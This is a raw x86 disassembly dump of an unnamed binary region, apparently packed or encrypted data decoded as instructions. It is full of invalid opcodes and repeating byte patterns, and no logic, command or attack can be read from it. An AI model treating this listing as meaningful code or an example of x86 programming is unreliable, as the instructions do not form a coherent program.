  419ec7:	add    ah,cl
  419ec9:	inc    ebx
  419eca:	add    eax,0x40402562
  419ecf:	add    BYTE PTR [eax+0x40],al
  419ed2:	inc    ecx
  419ed3:	inc    ecx
  419ed4:	add    eax,0x78434025
  419ed9:	bound  eax,QWORD PTR [eax-0x7c]
  419edc:	inc    eax
  419edd:	inc    ecx
  419ede:	push   edx
  419edf:	aas    
  419ee0:	lods   al,BYTE PTR cs:[esi]
  419ee2:	sar    BYTE PTR ds:0x4f98fc0d,1
  419ee8:	mov    cl,0x52
  419eea:	or     bl,dh
  419eec:	leave  
  419eed:	cmp    DWORD PTR [ebx-0x6c],eax
  419ef0:	push   edx
  419ef1:	push   0x8841c461
  419ef6:	add    eax,0x62a05369
  419efb:	dec    edi
  419efc:	test   eax,0x526e6563
  419f01:	cmovl  esp,edx
  419f04:	ret    
  419f05:	(bad)
  419f08:	cmc    
  419f09:	lods   al,BYTE PTR ds:[esi]
  419f0a:	sub    DWORD PTR [edi+0x4c],esi
  419f0d:	addr16 out 0x41,eax
  419f10:	inc    eax
  419f11:	inc    eax
  419f12:	inc    ebx
  419f13:	int3   
  419f14:	add    BYTE PTR ds:0x56240,al
  419f1a:	inc    ebx
  419f1b:	inc    eax
  419f1c:	inc    eax
  419f1d:	add    BYTE PTR [ecx+0x62],al
  419f20:	bound  eax,QWORD PTR [eax]
  419f22:	int3   
  419f23:	inc    eax
  419f24:	inc    ebx
  419f25:	add    eax,0x43624041
  419f2a:	adc    BYTE PTR [ecx+0x5],al
  419f2d:	inc    eax
  419f2e:	push   esp
  419f2f:	inc    eax
  419f30:	push   edx
  419f31:	cmp    eax,0xaa954462
  419f36:	mov    bl,0x11
  419f38:	int    0xb9
  419f3a:	test   al,0xd2
  419f3c:	sub    ecx,DWORD PTR [ebx]
  419f3e:	sti    
  419f3f:	inc    esp
  419f40:	xor    ebp,DWORD PTR [ecx-0x300b4ff3]
  419f46:	jne    0x419f99
  419f48:	pop    ebp
  419f49:	sub    ecx,ecx
  419f4b:	bound  esp,QWORD PTR [ebx+0x17]
  419f4e:	mov    bl,0xbf
  419f50:	gs ds xchg ecx,eax
  419f53:	leave  
  419f54:	or     DWORD PTR [esi],ebp
  419f56:	pop    esp
  419f57:	inc    edx
  419f58:	bswap  ebx
  419f5a:	mov    bl,0x42
  419f5c:	or     cl,0xd7
  419f5f:	fwait
  419f60:	lods   al,BYTE PTR ds:[esi]
  419f61:	adc    dl,BYTE PTR [ebx-0x80]
  419f64:	bound  eax,QWORD PTR [ebx+0x40]
  419f67:	adc    BYTE PTR ds:0x4158cc40,al
  419f6d:	inc    ebx
  419f6e:	bound  eax,QWORD PTR [ecx+0x40]
  419f71:	add    eax,0x4140
  419f76:	and    eax,0x40400062
  419f7b:	add    eax,0x84404340
  419f80:	int3   
  419f81:	js     0x419f83
  419f83:	inc    ecx
  419f84:	adc    BYTE PTR [edx+0xf],ah
  419f87:	xor    eax,0x524a76e9
  419f8c:	dec    esp
  419f8d:	retf   
  419f8e:	sbb    DWORD PTR [eax],esp
  419f90:	dec    ecx
  419f91:	mov    dl,0x12
  419f93:	lds    edx,FWORD PTR ds:0x1162bf25
  419f99:	push   0xa9cbef33
  419f9e:	(bad)  
  419f9f:	int    0xd1
  419fa1:	add    BYTE PTR [eax+0x41],al
  419fa4:	inc    eax
  419fa5:	inc    ebx
  419fa6:	bound  ax,DWORD PTR ds:0x40434100
  419fad:	add    eax,0x40054062
  419fb2:	bound  eax,QWORD PTR [ecx+0x40]
  419fb5:	inc    ebx
  419fb6:	inc    eax
  419fb7:	add    eax,0x25405841
  419fbc:	bound  eax,QWORD PTR [eax+0x43]
  419fbf:	inc    eax
  419fc0:	adc    BYTE PTR [ebp+0x4b],cl
  419fc3:	jns    0x419fc5
  419fc5:	push   edx
  419fc6:	push   edx
  419fc7:	jnp    0x419f6e
  419fc9:	aad    0xf1
  419fcb:	sub    al,BYTE PTR gs:[esi+0x4d068534]
  419fd2:	pop    es
  419fd3:	cmovo  esp,esp
  419fd6:	add    BYTE PTR ds:0xacb1df26,dh
  419fdc:	inc    ebp
  419fdd:	push   edx
  419fde:	mov    ds:0x414d9414,al
  419fe3:	push   edx
  419fe4:	and    ecx,ebx
  419fe6:	ret    
  419fe7:	arpl   WORD PTR [edi+ebx*8],bp
  419fea:	pop    ss
  419feb:	mov    esp,0x6c4252f0
  419ff0:	fld    QWORD PTR [eax+0x1e]
  419ff3:	and    BYTE PTR [edx-0x55],0x4e
  419ff7:	in     al,0x40
  419ff9:	inc    ecx
  419ffa:	inc    ebx
  419ffb:	inc    eax
  419ffc:	add    eax,0x43406262
  41a001:	inc    ecx
  41a002:	adc    BYTE PTR [eax],al
  41a004:	inc    eax
  41a005:	add    eax,0x43000562
  41a00a:	add    BYTE PTR [ecx+0x40],al
  41a00d:	inc    eax
  41a00e:	add    eax,0x400062
  41a013:	inc    ebx
  41a014:	inc    eax
  41a015:	js     0x41a058
  41a017:	inc    ecx
  41a018:	bound  eax,QWORD PTR [eax+0x36]
  41a01b:	push   ebp
  41a01c:	icebp  
  41a01d:	cli    
  41a01e:	add    eax,0x623538bc
  41a023:	scas   eax,DWORD PTR es:[edi]
  41a024:	inc    edi
  41a025:	ja     0xc955bd6c
  41a02b:	push   esi
  41a02c:	xchg   ecx,eax
  41a02d:	lods   eax,DWORD PTR ds:[esi]
  41a02e:	mov    esp,0x516398fd
  41a033:	fistp  WORD PTR [edi+0x62a08e52]
  41a039:	push   ecx
  41a03a:	mov    cl,0x4e
  41a03c:	inc    ebp
  41a03d:	pop    edi
  41a03e:	inc    eax
  41a03f:	arpl   bp,ax
  41a041:	pushf  
  41a042:	dec    esp
  41a043:	mov    ch,0x32
  41a045:	mov    al,ds:0x354fa011
  41a04a:	mov    esi,0x5d0f2d40
  41a04f:	inc    ecx
  41a050:	inc    esp
  41a051:	adc    al,0x62
  41a053:	inc    eax
  41a054:	add    eax,0x40430041
  41a059:	inc    eax
  41a05a:	inc    ecx
  41a05b:	inc    eax
  41a05c:	inc    eax
  41a05d:	bound  eax,QWORD PTR ds:0x5624300
  41a063:	add    BYTE PTR [eax+0x40],al
  41a066:	add    BYTE PTR [ecx+0x43],al
  41a069:	add    BYTE PTR [eax+0x41],al
  41a06c:	add    eax,0x40436200
  41a071:	inc    eax
  41a072:	add    eax,0x4d31ab62
  41a077:	lods   al,BYTE PTR ds:[esi]
  41a078:	bound  edi,QWORD PTR [ecx+0x29be6340]
  41a07e:	repz push edx
  41a080:	add    eax,0x7148fb80
  41a085:	(bad)  
  41a086:	jle    0x41a0eb
  41a088:	xchg   DWORD PTR [eax+0x5404167],ebp
  41a08e:	inc    eax
  41a08f:	inc    ebx
  41a090:	bound  eax,QWORD PTR [ecx-0x7c]
  41a093:	add    BYTE PTR ds:0x404043,ah
  41a099:	add    BYTE PTR ds:0x626210,al
  41a09f:	add    eax,0x43404140
  41a0a4:	inc    eax
  41a0a5:	inc    ecx
  41a0a6:	add    eax,0x10664062
  41a0ab:	inc    ebx
  41a0ac:	bound  ebx,QWORD PTR [ebp+ebx*8+0x3a2c9943]
  41a0b3:	adc    DWORD PTR [ecx+0x35],ecx
  41a0b6:	cmp    al,0xbf
  41a0b8:	push   esp
  41a0b9:	xchg   si,ax
  41a0bb:	dec    esp
  41a0bc:	test   eax,0x362a2814
  41a0c1:	(bad)  
  41a0c3:	inc    ecx
  41a0c4:	push   eax
  41a0c5:	arpl   WORD PTR ds:0x4041cc,ax
  41a0cb:	add    BYTE PTR [eax],al
  41a0cd:	inc    eax
  41a0ce:	inc    eax
  41a0cf:	inc    ebx
  41a0d0:	bound  eax,QWORD PTR [eax]
  41a0d2:	inc    eax
  41a0d3:	inc    eax
  41a0d4:	add    eax,0x62434162
  41a0d9:	inc    eax
  41a0da:	js     0x41a0ec
  41a0dc:	inc    ecx
  41a0dd:	add    eax,0x5404325
  41a0e2:	bound  eax,QWORD PTR [eax+0x40]
  41a0e5:	inc    ecx
  41a0e6:	inc    ebx
  41a0e7:	rcr    BYTE PTR [edi+0x2b],cl
  41a0ea:	lods   al,BYTE PTR ds:[esi]
  41a0eb:	nop
  41a0ec:	test   cl,cl
  41a0ee:	lds    ebx,FWORD PTR [edi+0x7e]
  41a0f1:	bound  edx,QWORD PTR [edx+0x62]
  41a0f4:	push   esp
  41a0f5:	es ja  0x41a0c2
  41a0f8:	call   edx
  41a0fa:	aad    0x98
  41a0fc:	push   ebx
  41a0fd:	mov    al,0xed
  41a0ff:	rol    cl,1
  41a101:	aaa    
  41a102:	aam    0x4b
  41a104:	push   esi
  41a105:	add    eax,0xfa7feb35
  41a10a:	pop    ecx
  41a10b:	leave  
  41a10c:	pop    esp
  41a10d:	retf   
  41a10e:	adc    al,0xe9
  41a110:	and    eax,0x436241
  41a115:	adc    BYTE PTR [eax+0x0],al
  41a118:	add    eax,0x62410040
  41a11d:	inc    eax
  41a11e:	add    BYTE PTR [ebx-0x34],al
  41a121:	inc    eax
  41a122:	add    eax,0x78434040
  41a127:	bound  eax,QWORD PTR [ecx+0x78]
  41a12a:	add    eax,0x62404043
  41a12f:	mov    edi,0x542f650d
  41a134:	push   eax
  41a135:	fs scas eax,DWORD PTR es:[edi]
  41a137:	popa   
  41a138:	jae    0x41a16f
  41a13a:	les    ecx,FWORD PTR [edi-0x40b39446]
  41a140:	inc    eax
  41a141:	int3   
  41a142:	dec    edi
  41a143:	test   al,0x81
  41a145:	inc    ecx
  41a146:	inc    eax
  41a147:	add    eax,0x43436240
  41a14c:	add    eax,0x62004040
  41a151:	inc    eax
  41a152:	add    BYTE PTR [ecx+0x40],al
  41a155:	inc    ebx
  41a156:	test   BYTE PTR ds:0x58054041,ah
  41a15c:	inc    eax
  41a15d:	inc    eax
  41a15e:	bound  eax,QWORD PTR [eax+0x66]
  41a161:	inc    ecx
  41a162:	inc    eax
  41a163:	add    eax,0x361f800
  41a168:	rcl    DWORD PTR [edx-0x41],1
  41a16b:	pusha  
  41a16c:	mov    ah,0x35
  41a16e:	aam    0xdf
  41a170:	inc    ebx
  41a171:	arpl   WORD PTR [eax-0x27ebb692],bp
  41a177:	push   edx
  41a178:	repz sub al,0x3d
  41a17b:	bound  edx,QWORD PTR [esp+eiz*2]
  41a17e:	dec    ebx
  41a17f:	adc    ebp,DWORD PTR [esi+0x63]
  41a182:	ret    
  41a183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a184:	adc    BYTE PTR [esi+0x51],dh
  41a187:	pusha  
  41a188:	cmc    
  41a189:	xor    eax,0xf463f4a8
  41a18e:	inc    edx
  41a18f:	xor    edi,DWORD PTR [edi-0x28]
  41a192:	add    eax,0x355465
  41a197:	add    BYTE PTR [ebx+0x40],al
  41a19a:	bound  eax,QWORD PTR ds:0x25404110
  41a1a0:	add    ah,cl
  41a1a2:	inc    ebx
  41a1a3:	add    eax,0x40402562
  41a1a8:	add    BYTE PTR [eax+0x40],al
  41a1ab:	inc    ecx
  41a1ac:	inc    ecx
  41a1ad:	add    eax,0x78434025
  41a1b2:	bound  eax,QWORD PTR [eax-0x7c]
  41a1b5:	inc    eax
  41a1b6:	inc    ecx
  41a1b7:	in     eax,0x6b
  41a1b9:	xchg   edx,eax
  41a1ba:	push   edx
  41a1bb:	leave  
  41a1bc:	mov    eax,ds:0xd17a14cc
  41a1c1:	cs gs xchg ecx,eax
  41a1c4:	cmp    al,0x81
  41a1c6:	arpl   WORD PTR [edi+0x485c0261],sp
  41a1cc:	push   ebp
  41a1cd:	(bad)  
  41a1ce:	lds    esi,FWORD PTR [eax]
  41a1d0:	adc    DWORD PTR [ebx],edx
  41a1d2:	sub    WORD PTR [ebx+esi*2+0x6b],cx
  41a1d7:	xchg   BYTE PTR [edi],cl
  41a1d9:	inc    esi
  41a1da:	xor    eax,0xe1a078d4
  41a1df:	mov    DWORD PTR [ecx+0x40],eax
  41a1e2:	inc    eax
  41a1e3:	inc    ebx
  41a1e4:	int3   
  41a1e5:	add    BYTE PTR ds:0x56240,al
  41a1eb:	inc    ebx
  41a1ec:	inc    eax
  41a1ed:	inc    eax
  41a1ee:	add    BYTE PTR [ecx+0x62],al
  41a1f1:	bound  eax,QWORD PTR [eax]
  41a1f3:	int3   
  41a1f4:	inc    eax
  41a1f5:	inc    ebx
  41a1f6:	add    eax,0x43624041
  41a1fb:	adc    BYTE PTR [ecx+0x5],al
  41a1fe:	inc    eax
  41a1ff:	adc    al,0xd3
  41a201:	fmul   st,st(0)
  41a203:	push   ebx
  41a204:	bound  esi,QWORD PTR [esp+eax*8]
  41a207:	xor    bh,BYTE PTR [ebx+0x50bf4352]
  41a20d:	je     0x41a23c
  41a20f:	mov    esi,0x883d6345
  41a214:	mov    al,ds:0x764ec062
  41a219:	mov    esp,0xa81c320
  41a21e:	jns    0x41a234
  41a220:	ins    BYTE PTR es:[edi],dx
  41a221:	xor    eax,0xd54231a8
  41a226:	bound  eax,QWORD PTR [ebx+0x40]
  41a229:	adc    BYTE PTR ds:0x4158cc40,al
  41a22f:	inc    ebx
  41a230:	bound  eax,QWORD PTR [ecx+0x40]
  41a233:	add    eax,0x4140
  41a238:	and    eax,0x40400062
  41a23d:	add    eax,0x84404340
  41a242:	int3   
  41a243:	js     0x41a245
  41a245:	inc    ecx
  41a246:	adc    BYTE PTR [edx+0xf],ah
  41a249:	jae    0x41a212
  41a24b:	inc    eax
  41a24c:	fcom   DWORD PTR [eax]
  41a24e:	xor    edi,0x75
  41a251:	add    eax,0x485224ff
  41a256:	mov    ch,0x4f
  41a258:	(bad)  
  41a259:	mov    edi,0x41b76216
  41a25e:	mov    esp,0x13f135b0
  41a263:	mov    cl,0xbc
  41a265:	das    
  41a266:	fs adc eax,0x467b4214
  41a26c:	xor    eax,0x414000a8
  41a271:	inc    eax
  41a272:	inc    ebx
  41a273:	bound  ax,DWORD PTR ds:0x40434100
  41a27a:	add    eax,0x40054062
  41a27f:	bound  eax,QWORD PTR [ecx+0x40]
  41a282:	inc    ebx
  41a283:	inc    eax
  41a284:	add    eax,0x25405841
  41a289:	bound  eax,QWORD PTR [eax+0x43]
  41a28c:	inc    eax
  41a28d:	adc    BYTE PTR [ebx+ecx*8+0x11407a64],ch
  41a294:	fdivr  DWORD PTR [esi-0x3d]
  41a297:	pop    bx
  41a299:	push   ebx
  41a29a:	push   eax
  41a29b:	aad    0x52
  41a29d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a29e:	inc    ecx
  41a29f:	xor    eax,0x317711f4
  41a2a4:	dec    eax
  41a2a5:	arpl   si,di
  41a2a7:	inc    ecx
  41a2a8:	xor    eax,0xbc7c1363
  41a2ad:	pop    edx
  41a2ae:	jp     0x41a269
  41a2b0:	inc    eax
  41a2b1:	inc    ecx
  41a2b2:	inc    ebx
  41a2b3:	inc    eax
  41a2b4:	add    eax,0x43406262
  41a2b9:	inc    ecx
  41a2ba:	adc    BYTE PTR [eax],al
  41a2bc:	inc    eax
  41a2bd:	add    eax,0x43000562
  41a2c2:	add    BYTE PTR [ecx+0x40],al
  41a2c5:	inc    eax
  41a2c6:	add    eax,0x400062
  41a2cb:	inc    ebx
  41a2cc:	inc    eax
  41a2cd:	js     0x41a310
  41a2cf:	inc    ecx
  41a2d0:	bound  eax,QWORD PTR [eax+0x14]
  41a2d3:	fnstcw WORD PTR [ebx+0x51]
  41a2d6:	xor    eax,0x64c3a82c
  41a2db:	push   esi
  41a2dc:	inc    esp
  41a2dd:	iret   
  41a2de:	fcom   DWORD PTR [edx+0x5e75bc4d]
  41a2e4:	sbb    eax,0x9d425261
  41a2e9:	or     eax,0x719b75e4
  41a2ee:	dec    eax
  41a2ef:	xor    eax,0x5c35f73a
  41a2f4:	adc    al,0x6b
  41a2f6:	mov    esp,0x144f4d80
  41a2fb:	jb     0x41a2d2
  41a2fd:	icebp  
  41a2fe:	xor    eax,0x6440bdd0
  41a303:	fiadd  WORD PTR [ebp+0x43]
  41a306:	fsub   DWORD PTR [edx+0x40]
  41a309:	add    eax,0x40430041
  41a30e:	inc    eax
  41a30f:	inc    ecx
  41a310:	inc    eax
  41a311:	inc    eax
  41a312:	bound  eax,QWORD PTR ds:0x5624300
  41a318:	add    BYTE PTR [eax+0x40],al
  41a31b:	add    BYTE PTR [ecx+0x43],al
  41a31e:	add    BYTE PTR [eax+0x41],al
  41a321:	add    eax,0x40436200
  41a326:	inc    eax
  41a327:	add    eax,0x40214262
  41a32c:	je     0x41a2d3
  41a32e:	xlat   BYTE PTR ds:[ebx]
  41a32f:	push   eax
  41a330:	push   edx
  41a331:	ss inc ecx
  41a333:	inc    edx
  41a334:	clc    
  41a335:	xchg   esp,eax
  41a336:	int3   
  41a337:	ss pop edx
  41a339:	sar    ch,0x78
  41a33c:	xor    esp,DWORD PTR [eax+0x36bc451f]
  41a342:	dec    ecx
  41a343:	test   eax,0x720ebee4
  41a348:	add    eax,0x625060d9
  41a34d:	cli    
  41a34e:	adc    BYTE PTR [edx],dh
  41a350:	inc    ecx
  41a351:	inc    eax
  41a352:	add    eax,0x41624340
  41a357:	test   BYTE PTR [eax],al
  41a359:	and    eax,0x404043
  41a35e:	add    BYTE PTR ds:0x626210,al
  41a364:	add    eax,0x43404140
  41a369:	inc    eax
  41a36a:	inc    ecx
  41a36b:	add    eax,0x10664062
  41a370:	inc    ebx
  41a371:	bound  esp,QWORD PTR [eax+eiz*2-0x56]
  41a375:	inc    esi
  41a376:	add    ah,al
  41a378:	jns    0x41a3eb
  41a37a:	bound  ebp,QWORD PTR [edx]
  41a37c:	dec    ebp
  41a37d:	inc    eax
  41a37e:	int    0x71
  41a380:	inc    eax
  41a381:	rol    ebp,1
  41a383:	loopne 0x41a322
  41a385:	enter  0xa364,0x77
  41a389:	pop    esi
  41a38a:	fadd   QWORD PTR ds:0xbff6ec3a
  41a390:	int3   
  41a391:	push   ecx
  41a392:	leave  
  41a393:	leave  
  41a394:	dec    ebp
  41a395:	arpl   ax,cx
  41a397:	and    bl,BYTE PTR [ecx-0x55]
  41a39a:	gs nop
  41a39c:	mov    ebp,0xb1654815
  41a3a1:	imul   esi,DWORD PTR ds:0x4041cc05,0x40000000
  41a3ab:	inc    eax
  41a3ac:	inc    ebx
  41a3ad:	bound  eax,QWORD PTR [eax]
  41a3af:	inc    eax
  41a3b0:	inc    eax
  41a3b1:	add    eax,0x62434162
  41a3b6:	inc    eax
  41a3b7:	js     0x41a3c9
  41a3b9:	inc    ecx
  41a3ba:	add    eax,0x5404325
  41a3bf:	bound  eax,QWORD PTR [eax+0x40]
  41a3c2:	inc    ecx
  41a3c3:	inc    ebx
  41a3c4:	inc    ebx
  41a3c5:	and    DWORD PTR [ebx+0x64],eax
  41a3c8:	dec    edx
  41a3c9:	adc    DWORD PTR [ecx+0x294d51d8],edx
  41a3cf:	fs test al,0xf9
  41a3d2:	inc    ebx
  41a3d3:	push   edx
  41a3d4:	cmp    ch,bh
  41a3d6:	(bad)  
  41a3d7:	call   0xd5f3b4dc
  41a3dc:	cld    
  41a3dd:	and    edx,DWORD PTR [edx-0x8]
  41a3e0:	mov    bl,0xff
  41a3e2:	ss aas 
  41a3e4:	dec    esp
  41a3e5:	fdiv   QWORD PTR ds:0x451196c7
  41a3eb:	xchg   ecx,eax
  41a3ec:	rol    DWORD PTR [eax+0x4a],0xbd
  41a3f0:	pushf  
  41a3f1:	call   ecx
  41a3f3:	push   ebp
  41a3f4:	(bad)  
  41a3f5:	mov    ah,0xb8
  41a3f7:	arpl   WORD PTR [esi+eax*2+0x62412550],dx
  41a3fe:	inc    ebx
  41a3ff:	add    BYTE PTR [eax],dl
  41a401:	inc    eax
  41a402:	add    BYTE PTR ds:0x62410040,al
  41a408:	inc    eax
  41a409:	add    BYTE PTR [ebx-0x34],al
  41a40c:	inc    eax
  41a40d:	add    eax,0x78434040
  41a412:	bound  eax,QWORD PTR [ecx+0x78]
  41a415:	add    eax,0x62404043
  41a41a:	xor    eax,0x3ac36e62
  41a41f:	and    ebx,DWORD PTR [edi+0x33]
  41a422:	fsub   DWORD PTR [ebp-0x35]
  41a425:	inc    edx
  41a426:	clc    
  41a427:	rcl    BYTE PTR [ebx],1
  41a429:	jnp    0x41a47d
  41a42b:	arpl   WORD PTR [esi],sp
  41a42d:	ins    BYTE PTR es:[edi],dx
  41a42e:	fs dec edi
  41a430:	mov    ch,0xdf
  41a432:	int    0x41
  41a434:	inc    eax
  41a435:	add    eax,0x43436240
  41a43a:	add    eax,0x62004040
  41a43f:	inc    eax
  41a440:	add    BYTE PTR [ecx+0x40],al
  41a443:	inc    ebx
  41a444:	test   BYTE PTR ds:0x58054041,ah
  41a44a:	inc    eax
  41a44b:	inc    eax
  41a44c:	bound  eax,QWORD PTR [eax+0x66]
  41a44f:	inc    ecx
  41a450:	inc    eax
  41a451:	add    eax,0x3848a700
  41a456:	(bad)  
  41a457:	fst    QWORD PTR [edx+0x69]
  41a45a:	int    0xc0
  41a45c:	add    eax,0xd134bc49
  41a461:	shr    ebp,1
  41a463:	or     cl,cl
  41a465:	xor    al,0x64
  41a467:	stos   BYTE PTR es:[edi],al
  41a468:	ds je  0x41a4bc
  41a46b:	ins    BYTE PTR es:[edi],dx
  41a46c:	es inc ebx
  41a46e:	sub    DWORD PTR [eax],eax
  41a470:	add    BYTE PTR [ebx+0x40],al
  41a473:	bound  eax,QWORD PTR ds:0x25404110
  41a479:	add    ah,cl
  41a47b:	inc    ebx
  41a47c:	add    eax,0x40402562
  41a481:	add    BYTE PTR [eax+0x40],al
  41a484:	inc    ecx
  41a485:	inc    ecx
  41a486:	add    eax,0x78434025
  41a48b:	bound  eax,QWORD PTR [eax-0x7c]
  41a48e:	inc    eax
  41a48f:	inc    ecx
  41a490:	stos   DWORD PTR es:[edi],eax
  41a491:	push   ecx
  41a492:	aad    0x3c
  41a494:	bound  esp,QWORD PTR [eax-0x46]
  41a497:	xchg   esp,eax
  41a498:	nop
  41a499:	inc    eax
  41a49a:	lahf   
  41a49b:	adc    al,0x44
  41a49d:	add    bl,0xba
  41a4a0:	scas   eax,DWORD PTR es:[edi]
  41a4a1:	mov    cl,0x64
  41a4a3:	stos   BYTE PTR es:[edi],al
  41a4a4:	test   eax,0xf0c042c3
  41a4a9:	mov    edi,0x48a9adf1
  41a4ae:	or     BYTE PTR [ecx+0x35423b8a],dl
  41a4b4:	mov    esp,0x5f633405
  41a4b9:	inc    ecx
  41a4ba:	inc    eax
  41a4bb:	inc    eax
  41a4bc:	inc    ebx
  41a4bd:	int3   
  41a4be:	add    BYTE PTR ds:0x56240,al
  41a4c4:	inc    ebx
  41a4c5:	inc    eax
  41a4c6:	inc    eax
  41a4c7:	add    BYTE PTR [ecx+0x62],al
  41a4ca:	bound  eax,QWORD PTR [eax]
  41a4cc:	int3   
  41a4cd:	inc    eax
  41a4ce:	inc    ebx
  41a4cf:	add    eax,0x43624041
  41a4d4:	adc    BYTE PTR [ecx+0x5],al
  41a4d7:	inc    eax
  41a4d8:	jbe    0x41a4cc
  41a4da:	fadd   DWORD PTR [ecx-0x9]
  41a4dd:	mov    ds:0x24aab8b8,al
  41a4e2:	push   edx
  41a4e3:	test   al,0x4f
  41a4e5:	clc    
  41a4e6:	dec    ebp
  41a4e7:	mov    bl,BYTE PTR [edx+0x65]
  41a4ea:	pusha  
  41a4eb:	fmul   DWORD PTR [ebx+0x62]
  41a4ee:	lods   eax,DWORD PTR ds:[esi]
  41a4ef:	outs   dx,BYTE PTR ds:[esi]
  41a4f0:	xor    DWORD PTR [ecx+0x58],esi
  41a4f3:	inc    esp
  41a4f4:	aas    
  41a4f5:	dec    esp
  41a4f6:	mov    dh,0x12
  41a4f8:	pop    esi
  41a4f9:	inc    edx
  41a4fa:	cmp    WORD PTR [edx],bx
  41a4fd:	mov    ecx,0x9131fb50
  41a502:	xor    eax,0xb981bac3
  41a507:	bound  eax,QWORD PTR [ebx+0x40]
  41a50a:	adc    BYTE PTR ds:0x4158cc40,al
  41a510:	inc    ebx
  41a511:	bound  eax,QWORD PTR [ecx+0x40]
  41a514:	add    eax,0x4140
  41a519:	and    eax,0x40400062
  41a51e:	add    eax,0x84404340
  41a523:	int3   
  41a524:	js     0x41a526
  41a526:	inc    ecx
  41a527:	adc    BYTE PTR [edx+0xf],ah
  41a52a:	lods   eax,DWORD PTR ds:[esi]
  41a52b:	add    al,0x41
  41a52d:	fmul   DWORD PTR [ebx+eax*8+0x43]
  41a531:	mov    ah,0xe9
  41a533:	bnd jno 0x41a588
  41a536:	or     eax,0x4b1f2748
  41a53b:	sub    DWORD PTR [eax-0x33],edi
  41a53e:	inc    edx
  41a53f:	adc    eax,0x394bd12
  41a544:	xchg   ecx,eax
  41a545:	and    ebp,DWORD PTR [ebx-0x9]
  41a548:	mov    esp,0x76d320b2
  41a54d:	dec    ecx
  41a54e:	dec    esp
  41a54f:	dec    edi
  41a550:	arpl   WORD PTR [eax+0x5b],dx
  41a553:	push   esi
  41a554:	jb     0x41a5ab
  41a556:	bound  edx,QWORD PTR [eax+ecx*2+0x0]
  41a55a:	inc    eax
  41a55b:	inc    ecx
  41a55c:	inc    eax
  41a55d:	inc    ebx
  41a55e:	bound  ax,DWORD PTR ds:0x40434100
  41a565:	add    eax,0x40054062
  41a56a:	bound  eax,QWORD PTR [ecx+0x40]
  41a56d:	inc    ebx
  41a56e:	inc    eax
  41a56f:	add    eax,0x25405841
  41a574:	bound  eax,QWORD PTR [eax+0x43]
  41a577:	inc    eax
  41a578:	adc    BYTE PTR [ecx+0x359f5788],bh
  41a57e:	js     0x41a5bc
  41a580:	adc    eax,0x35fbe3b0
  41a585:	fadd   st,st(3)
  41a587:	add    DWORD PTR [ebx+0xd],eax
  41a58a:	daa    
  41a58b:	dec    edx
  41a58c:	je     0x41a5e0
  41a58e:	dec    esp
  41a58f:	inc    edi
  41a590:	mov    eax,0x33306bc6
  41a595:	add    ebp,DWORD PTR [eax+0x40]
  41a598:	adc    eax,0x68321e5e
  41a59d:	lods   al,BYTE PTR ds:[esi]
  41a59e:	stos   DWORD PTR es:[edi],eax
  41a59f:	inc    esi
  41a5a0:	mul    DWORD PTR [ebp+0x73]
  41a5a3:	or     DWORD PTR [ebp+0x43414035],esi
  41a5a9:	inc    eax
  41a5aa:	add    eax,0x43406262
  41a5af:	inc    ecx
  41a5b0:	adc    BYTE PTR [eax],al
  41a5b2:	inc    eax
  41a5b3:	add    eax,0x43000562
  41a5b8:	add    BYTE PTR [ecx+0x40],al
  41a5bb:	inc    eax
  41a5bc:	add    eax,0x400062
  41a5c1:	inc    ebx
  41a5c2:	inc    eax
  41a5c3:	js     0x41a606
  41a5c5:	inc    ecx
  41a5c6:	bound  eax,QWORD PTR [eax+0x62]
  41a5c9:	sub    BYTE PTR [edi-0x52],cl
  41a5cc:	cwde   
  41a5cd:	adc    DWORD PTR [ebx-0x28],ecx
  41a5d0:	inc    ebp
  41a5d1:	idiv   DWORD PTR [eax-0x4cad89a6]
  41a5d7:	push   edx
  41a5d8:	inc    edx
  41a5d9:	dec    edi
  41a5da:	or     eax,0x4a918fbd
  41a5df:	push   esi
  41a5e0:	test   eax,0x3acc961
  41a5e5:	sbb    ch,dh
  41a5e7:	lods   al,BYTE PTR ds:[esi]
  41a5e8:	mov    esp,0x54062d0
  41a5ed:	inc    ecx
  41a5ee:	add    BYTE PTR [ebx+0x40],al
  41a5f1:	inc    eax
  41a5f2:	inc    ecx
  41a5f3:	inc    eax
  41a5f4:	inc    eax
  41a5f5:	bound  eax,QWORD PTR ds:0x5624300
  41a5fb:	add    BYTE PTR [eax+0x40],al
  41a5fe:	add    BYTE PTR [ecx+0x43],al
  41a601:	add    BYTE PTR [eax+0x41],al
  41a604:	add    eax,0x40436200
  41a609:	inc    eax
  41a60a:	add    eax,0xf2542662
  41a60f:	sbb    cl,BYTE PTR [ecx+0x35]
  41a612:	inc    ecx
  41a613:	daa    
  41a614:	inc    eax
  41a615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a616:	add    BYTE PTR [ecx+0x1e],0xd8
  41a61a:	push   ecx
  41a61b:	je     0x41a65d
  41a61d:	stos   BYTE PTR es:[edi],al
  41a61e:	add    BYTE PTR [edi+0x14],bh
  41a621:	push   edx
  41a622:	js     0x41a604
  41a624:	dec    edi
  41a625:	dec    ebp
  41a626:	mov    cs,WORD PTR [edx]
  41a628:	inc    eax
  41a629:	imul   esp,DWORD PTR gs:[edx-0x41],0xffffffad
  41a62e:	cli    
  41a62f:	pop    ds
  41a630:	push   ecx
  41a631:	pop    esp
  41a632:	sub    al,0x5
  41a634:	mov    eax,ds:0x3dd48fa8
  41a639:	data16 sub al,0xf7
  41a63c:	rol    DWORD PTR [esi-0xb],0xff
  41a640:	inc    esp
  41a641:	xor    eax,0x54041bf
  41a646:	inc    eax
  41a647:	inc    ebx
  41a648:	bound  eax,QWORD PTR [ecx-0x7c]
  41a64b:	add    BYTE PTR ds:0x404043,ah
  41a651:	add    BYTE PTR ds:0x626210,al
  41a657:	add    eax,0x43404140
  41a65c:	inc    eax
  41a65d:	inc    ecx
  41a65e:	add    eax,0x10664062
  41a663:	inc    ebx
  41a664:	bound  eax,QWORD PTR [ebp+0x48]
  41a667:	mov    ch,0x1e
  41a669:	(bad)  
  41a66a:	cmp    eax,ebx
  41a66c:	mov    esp,0x45a6f73e
  41a671:	outs   dx,BYTE PTR ds:[esi]
  41a672:	jne    0x41a6c6
  41a674:	add    eax,0x92154f40
  41a679:	stos   DWORD PTR es:[edi],eax
  41a67a:	cmc    
  41a67b:	mov    esp,0x3850ac87
  41a680:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41a682:	jne    0x41a62c
  41a684:	and    BYTE PTR [ebx+eax*2-0x16],bh
